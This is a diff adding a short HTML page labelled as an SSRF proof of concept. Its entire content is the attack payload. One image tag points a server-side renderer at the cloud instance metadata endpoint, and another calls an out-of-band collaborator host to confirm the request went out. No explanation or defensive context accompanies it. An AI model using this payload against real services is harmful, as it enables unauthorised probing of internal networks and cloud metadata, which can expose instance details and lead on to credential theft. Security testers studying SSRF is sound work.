@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>SSRF PoC</title>
+</head>
+<body>
+  <h1>Triggering internal fetch...</h1>
+  <img src="http://169.254.169.254/latest/meta-data/hostname">
+  <img src="http://burp-collaborator.yourdomain.com">
+</body>
+</html>
